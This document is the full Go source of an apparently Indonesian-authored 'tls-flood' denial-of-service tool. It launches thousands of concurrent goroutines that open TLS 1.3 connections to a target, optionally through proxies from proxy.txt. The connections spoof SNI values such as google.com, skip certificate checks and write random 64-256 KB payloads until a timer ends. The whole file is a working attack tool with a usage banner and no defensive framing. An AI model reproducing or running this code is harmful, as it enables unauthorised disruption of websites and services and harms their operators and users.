package main

import (
"bufio"
"context"
"crypto/tls"
"fmt"
"math/rand"
"net"
"net/url"
"os"
"os/signal"
"runtime"
"strconv"
"strings"
"sync"
"syscall"
"time"
)

const (
wrk = 1500
sub = 5
Dialer_Timeout = 3 * time.Second
Handsake_Timeout = 3 * time.Second
Write_Timeout = 5 * time.Second
Min_Data_Size = 64 * 1024
Max_Data_Size = 256 * 1024
)

var Pencarian = []string{
"google.com",
"yahoo.com",
"duckduckgo.com",
}

type CacheTLS struct {
mu sync.Mutex
data map[string]*tls.ClientSessionState
}

func (c *CacheTLS) Get(sessionKey string) (*tls.ClientSessionState, bool) {
c.mu.Lock()
defer c.mu.Unlock()
state, ok := c.data[sessionKey]
return state, ok
}

func (c *CacheTLS) Put(sessionKey string, cs *tls.ClientSessionState) {
c.mu.Lock()
defer c.mu.Unlock()
c.data[sessionKey] = cs
}

var CacheSesi = &CacheTLS{data: make(map[string]*tls.ClientSessionState)}

func RandominSni() string {
return Pencarian[rand.Intn(len(Pencarian))]
}

func Tls_Confignya(pakaiCache bool) *tls.Config {
cfg := &tls.Config{
InsecureSkipVerify: true,
ServerName: RandominSni(),
MinVersion: tls.VersionTLS13,
MaxVersion: tls.VersionTLS13,
}
if pakaiCache {
cfg.ClientSessionCache = CacheSesi
} else {
cfg.ClientSessionCache = nil
}
return cfg
}

func Proxy_Dialer(Proxy_Convert *url.URL, Cari_Target_Link string) (net.Conn, error) {
conn, err := net.DialTimeout("tcp", Proxy_Convert.Host, Dialer_Timeout)
if err != nil {
return nil, err
}
req := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", Cari_Target_Link, Cari_Target_Link)
_, err = conn.Write([]byte(req))
if err != nil {
conn.Close()
return nil, err
}
resp := make([]byte, 1024)
n, err := conn.Read(resp)
if err != nil || n == 0 {
conn.Close()
return nil, fmt.Errorf("proxy CONNECT failed")
}
if !strings.Contains(string(resp[:n]), "200 Connection established") {
conn.Close()
return nil, fmt.Errorf("proxy returned non-200: %s", string(resp[:n]))
}
return conn, nil
}

func Tls_Send(conn net.Conn, ctx context.Context) error {
pakaiCache := rand.Intn(2) == 0
cfg := Tls_Confignya(pakaiCache)
tlsConn := tls.Client(conn, cfg)

handCtx, cancel := context.WithTimeout(context.Background(), Handsake_Timeout)
defer cancel()
errCh := make(chan error, 1)
go func() {
errCh <- tlsConn.Handshake()
}()
var err error
select {
case err = <-errCh:
case <-handCtx.Done():
tlsConn.Close()
return handCtx.Err()
}
if err != nil {
tlsConn.Close()
return err
}

dataSize := Min_Data_Size + rand.Intn(Max_Data_Size-Min_Data_Size+1)
dummy := make([]byte, dataSize)
rand.Read(dummy)

for {
select {
case <-ctx.Done():
tlsConn.Close()
return ctx.Err()
default:
}
tlsConn.SetDeadline(time.Now().Add(Write_Timeout))
_, err = tlsConn.Write(dummy)
if err != nil {
break
}
}
tlsConn.Close()
return nil
}

func main() {
runtime.GOMAXPROCS(runtime.NumCPU())
rand.Seed(time.Now().UnixNano())

if len(os.Args) < 2 {
fmt.Println("cara make nya : tls-flood <target> [duration]")
fmt.Println("Detail : tls-flood https://jembotmu.com 60")
os.Exit(1)
}
target := os.Args[1]
dur := 0
if len(os.Args) >= 3 {
if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
dur = d
}
}

parsed, _ := url.Parse(target)
host := parsed.Hostname()
port := parsed.Port()
if port == "" {
port = "443"
}
Cari_Target_Link := host + ":" + port

var Proxy_File []*url.URL
file, err := os.Open("proxy.txt")
if err == nil {
defer file.Close()
scanner := bufio.NewScanner(file)
for scanner.Scan() {
line := strings.TrimSpace(scanner.Text())
if line == "" {
continue
}
if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
line = "http://" + line
}
if p, err := url.Parse(line); err == nil {
Proxy_File = append(Proxy_File, p)
}
}
}
if len(Proxy_File) == 0 {
Proxy_File = append(Proxy_File, nil)
}

fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
fmt.Printf("ޗ | Method : TLS-FLOOD (Pure TLS + Data Suntikan + Cache Variasi)\n")
fmt.Printf("ޗ | Ulimit : 1048576\n")
fmt.Printf("ޗ | Target : %s\n", target)
fmt.Printf("ޗ | Time : %d seconds\n", dur)
fmt.Printf("ޗ | Proxy : %d\n", len(Proxy_File))
fmt.Printf("ޗ | Conc : %d\n", wrk)
fmt.Printf("ޗ | Sub : %d\n", sub)
fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

ctx, cancel := context.WithCancel(context.Background())
var wg sync.WaitGroup

if dur > 0 {
time.AfterFunc(time.Duration(dur)*time.Second, func() {
cancel()
})
}

for i := 0; i < wrk; i++ {
wg.Add(1)
proxy := Proxy_File[i%len(Proxy_File)]
go func(Proxy_Convert *url.URL) {
defer wg.Done()
var swg sync.WaitGroup
for s := 0; s < sub; s++ {
swg.Add(1)
go func() {
defer swg.Done()
for ctx.Err() == nil {
var conn net.Conn
var err error
if Proxy_Convert == nil {
conn, err = net.DialTimeout("tcp", Cari_Target_Link, Dialer_Timeout)
} else {
conn, err = Proxy_Dialer(Proxy_Convert, Cari_Target_Link)
}
if err != nil {
continue
}
_ = Tls_Send(conn, ctx)
}
}()
}
swg.Wait()
}(proxy)
}

sig := make(chan os.Signal, 1)
signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
select {
case <-sig:
cancel()
case <-ctx.Done():
}
wg.Wait()
}
